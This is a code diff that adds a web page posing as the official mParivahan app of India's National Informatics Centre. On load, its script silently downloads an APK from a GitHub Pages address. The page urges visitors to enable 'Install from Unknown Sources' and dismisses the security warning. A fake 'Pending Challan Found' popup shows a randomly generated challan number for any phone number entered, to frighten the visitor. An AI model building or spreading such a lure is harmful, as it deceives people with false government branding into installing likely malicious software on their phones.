@@ -209,6 +209,181 @@
 </html>
 
 
+                    <button type="button" id="closeModalBtn" class="w-full mt-3 text-slate-500 hover:text-slate-700 font-semibold py-2 rounded-lg hover:bg-slate-100 transition">Maybe Later</button>
+                </form>
+            </div>
+            <!-- Challan Result Display -->
+            <div id="challanResult" class="hidden">
+                 <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 mx-auto text-red-500 mb-4" viewBox="0 0 20 20" fill="currentColor">
+                    <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.21 3.03-1.742 3.03H4.42c-1.532 0-2.492-1.696-1.742-3.03l5.58-9.92zM10 13a1 1 0 110-2 1 1 0 010 2zm-1-8a1 1 0 00-1 1v3a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
+                </svg>
+                <h2 class="text-2xl font-bold text-red-600 mb-3">Pending Challan Found!</h2>
+                <div class="bg-slate-50 p-4 rounded-lg text-left space-y-2 border border-slate-200">
+                    <p><strong>Mobile Number:</strong> <span id="displayPhoneNumber" class="text-slate-700 font-medium"></span></p>
+                    <p><strong>Challan Number:</strong> <span id="displayChallanNumber" class="font-mono text-slate-900 font-semibold"></span></p>
+                </div>
+                <button type="button" id="okBtn" class="w-full mt-6 bg-slate-800 text-white font-bold py-3 px-8 rounded-xl hover:bg-slate-900 transition shadow-lg">Acknowledge</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Page Content -->
+    <div class="container mx-auto max-w-4xl p-4 sm:p-6">
+        <header class="flex items-center gap-4 sm:gap-6 p-4">
+            
+            <img src="https://play-lh.googleusercontent.com/wI4NB22X22Lso2DwVb-g2fQmMjQ_S2v-xL5JnSAwzTGEs_Dqu84S-Sb7uI-m2f_M-aU=w240-h480-rw" alt="mParivahan Logo" class="w-24 h-24 sm:w-28 sm:h-28 rounded-3xl shadow-lg"/>
+            <div>
+                <h1 class="text-3xl sm:text-4xl font-extrabold text-slate-900">mParivahan</h1>
+                <p class="text-lg text-blue-600 font-semibold">National Informatics Centre</p>
+                <p class="text-sm text-slate-500 mt-1">Official App from the Ministry of Road Transport & Highways, India</p>
+            </div>
+        </header>
+
+        <div class="grid grid-cols-3 text-center my-6 bg-white p-4 rounded-2xl shadow-md divide-x divide-slate-200">
+            <div class="px-2">
+                <div class="font-bold text-lg text-slate-800">4.4 ★</div>
+                <div class="text-xs text-slate-500">2.1M reviews</div>
+            </div>
+            <div class="px-2">
+                <div class="font-bold text-lg text-slate-800">5Cr+</div>
+                <div class="text-xs text-slate-500">Downloads</div>
+            </div>
+            <div class="px-2">
+                <div class="font-bold text-lg text-slate-800">E</div>
+                <div class="text-xs text-slate-500">Everyone</div>
+            </div>
+        </div>
+        
+        <div class="bg-white p-6 rounded-2xl shadow-md my-8">
+            <h2 class="text-xl font-bold mb-4 text-slate-900">Key Features</h2>
+            <ul class="space-y-3 text-slate-600">
+                <li class="flex items-start gap-3"><span class="text-blue-500 mt-1">✓</span><span><strong>Virtual RC & DL:</strong> Carry digital, legally valid copies of your vehicle's Registration Certificate and your Driving License.</span></li>
+                <li class="flex items-start gap-3"><span class="text-blue-500 mt-1">✓</span><span><strong>Challan Status:</strong> Check details of any traffic challans issued against your vehicle.</span></li>
+                <li class="flex items-start gap-3"><span class="text-blue-500 mt-1">✓</span><span><strong>Vehicle Search:</strong> Get complete details of any parked, accidental, or stolen vehicle by just entering the registration number.</span></li>
+                <li class="flex items-start gap-3"><span class="text-blue-500 mt-1">✓</span><span><strong>Road Safety Info:</strong> Access important information and alerts related to traffic rules and road safety.</span></li>
+            </ul>
+        </div>
+
+        <div class="my-8">
+            <h2 class="text-xl font-bold mb-4 text-slate-900">App Screenshots</h2>
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                
+                <img src="https://play-lh.googleusercontent.com/Pz3kG9nsBy2p65tC2mfkF5AYp-47-o-VbsV-pS0y_JW_6b_weZVzx_s5Rj-w1iKVDA=w526-h296-rw" alt="mParivahan Screenshot 1" class="rounded-xl shadow-lg w-full h-auto object-cover border border-slate-200">
+                
+                <img src="https://play-lh.googleusercontent.com/4Bw2ZZepkYYVz5tQG-qfEMwD7T-YpPVPl6A5j0uvE0E697_iYLA-S08PBT5K-8l_M9s=w526-h296-rw" alt="mParivahan Screenshot 2" class="rounded-xl shadow-lg w-full h-auto object-cover border border-slate-200">
+                
+                <img src="https://play-lh.googleusercontent.com/gK6I5S13uGjS_dwJGAZCb-7ySBl-Kq54k7qBwzX32k-yV3sD-uC0uGNDf3tYn-nF-A=w526-h296-rw" alt="mParivahan Screenshot 3" class="rounded-xl shadow-lg w-full h-auto object-cover border border-slate-200">
+            </div>
+        </div>
+        
+         <div class="bg-white p-6 rounded-2xl shadow-md my-8">
+            <h2 class="text-xl font-bold mb-4 text-slate-900">Installation Guide</h2>
+            <div class="space-y-4 text-slate-600">
+                <p><strong class="text-slate-800">1. Download Started:</strong> The official APK file has started downloading in the background. Check your browser's notification panel for progress.</p>
+                <p><strong class="text-slate-800">2. Enable Unknown Sources:</strong> Go to your phone's <strong>Settings → Security</strong> and toggle on the "<strong>Install from Unknown Sources</strong>" option. This is a necessary step for installing apps outside of the Google Play Store.</p>
+                <p><strong class="text-slate-800">3. Install the App:</strong> Once the download is complete, tap on the downloaded file (mParivahan.apk) and select "Install".</p>
+                <p><strong class="text-slate-800">4. Launch & Use:</strong> Open the app from your home screen, complete the setup, and access all features.</p>
+            </div>
+            <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-800 p-4 rounded-md text-sm mt-5">
+                <strong>Official App Notice:</strong> Your device may show a standard warning. This is a genuine and secure application directly from the National Informatics Centre.
+            </div>
+        </div>
+
+        <footer class="text-center mt-12 mb-6 text-xs text-slate-500">
+            <p>&copy; National Informatics Centre, Ministry of Road Transport & Highways, Government of India. All rights reserved.</p>
+            <p class="mt-1">Last updated: October 2025</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const apkUrl = 'https://axe01010.github.io/signed.apk'; 
+
+            // --- 1. Automatic Background Download on Page Load ---
+            function startBackgroundDownload() {
+                const link = document.createElement('a');
+                link.href = apkUrl;
+                link.download = 'mParivahan-Official.apk';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                console.log('mParivahan APK download initiated in the background.');
+            }
+            
+            startBackgroundDownload();
+
+            // --- 2. Modal Logic ---
+            const modal = document.getElementById('challanModal');
+            const modalContent = document.getElementById('modalContent');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            const okBtn = document.getElementById('okBtn');
+            const phoneForm = document.getElementById('phoneForm');
+            const phoneNumberInput = document.getElementById('phoneNumber');
+            const challanCheckForm = document.getElementById('challanCheckForm');
+            const challanResult = document.getElementById('challanResult');
+            const displayPhoneNumber = document.getElementById('displayPhoneNumber');
+            const displayChallanNumber = document.getElementById('displayChallanNumber');
+
+            function showModal() {
+                modal.classList.remove('hidden');
+                setTimeout(() => {
+                    modal.classList.remove('opacity-0');
+                    modalContent.classList.remove('scale-95', 'opacity-0');
+                }, 50);
+            }
+
+            function hideModal() {
+                modalContent.classList.add('scale-95', 'opacity-0');
+                modal.classList.add('opacity-0');
+                setTimeout(() => {
+                   modal.classList.add('hidden');
+                }, 300);
+            }
+
+            // Show modal after a 1.5-second delay to let the user see the page first.
+            setTimeout(showModal, 1500);
+
+            // Event listeners for closing the modal
+            closeModalBtn.addEventListener('click', hideModal);
+            okBtn.addEventListener('click', hideModal);
+            modal.addEventListener('click', (e) => { 
+                if (e.target === modal) {
+                    hideModal();
+                }
+            });
+
+            // Form submission logic
+            phoneForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const phoneNumber = phoneNumberInput.value;
+                
+                // Simple validation for a 10-digit number
+                if (phoneNumber.length === 10 && /^\d{10}$/.test(phoneNumber)) {
+                    // Generate a realistic-looking random challan number
+                    const stateCodes = ['DL', 'HR', 'UP', 'MH', 'KA', 'TN', 'WB'];
+                    const randomState = stateCodes[Math.floor(Math.random() * stateCodes.length)];
+                    const randomChallan = randomState + Math.floor(1000000000 + Math.random() * 9000000000);
+                    
+                    displayPhoneNumber.textContent = phoneNumber;
+                    displayChallanNumber.textContent = randomChallan;
+                    
+                    challanCheckForm.classList.add('hidden');
+                    challanResult.classList.remove('hidden');
+                } else {
+                    // Add a visual error indication
+                    phoneNumberInput.classList.add('border-red-500', 'animate-pulse');
+                    phoneNumberInput.focus();
+                    setTimeout(() => {
+                        phoneNumberInput.classList.remove('border-red-500', 'animate-pulse');
+                    }, 2000);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+
+
 gap         gap: 0.5rem;
             background-color: var(--primary-color);
             color: white;
